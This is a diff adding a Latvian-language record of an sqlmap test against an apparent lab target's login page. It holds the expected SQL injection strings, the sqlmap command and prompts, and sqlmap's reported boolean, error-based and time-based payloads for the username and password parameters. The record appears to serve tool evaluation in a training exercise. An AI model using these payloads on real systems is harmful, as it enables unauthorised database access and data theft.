@@ -1,0 +1,54 @@
+=================================================================================
+1. Īpašība: “Hello, world” – vajadzētu strādāt visvienkāršākajām injekcijām
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?username=test&password=test' or '1'='1
+3.2. error-based: ?username=test'&password=test
+3.3. time-based: ?username=test&password=test' or 
+sleep(1)%23
+3.4. union: ?username=test&password=test' union select 1,2,3%23
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 9947063 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://192.168.17.134/sqlinjection/example1/?username=test&password=test" -p username,password --risk=3 --level=5
+
+7. Jautājumi, kurus uzdeva SQLMap:
+1.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+1.2. do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+1.3. injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+1.4. injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+1.5. GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+1.6. GET parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+1.7. there were multiple injection points, please select the one to use for following injections: 0 (0 nozīmē = parameter: username)
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 781 HTTP(s) requests:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-3898' OR 5515=5515-- GcAx&password=test
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=test' AND (SELECT 8005 FROM(SELECT COUNT(*),CONCAT(0x71706b6a71,(SELECT (ELT(8005=8005,1))),0x71766a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kSTN&password=test
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: username=test' OR SLEEP(5)-- UrNl&password=test
+
+Parameter: password (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=test&password=-4420' OR 1389=1389-- KNGs
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=test&password=test' AND (SELECT 2582 FROM(SELECT COUNT(*),CONCAT(0x71706b6a71,(SELECT (ELT(2582=2582,1))),0x71766a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- oCeY
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: username=test&password=test' OR SLEEP(5)-- BpsR
+---
+web server operating system: Linux Debian 6 (squeeze)
+web application technology: Apache 2.2.16
+back-end DBMS: MySQL >= 5.0
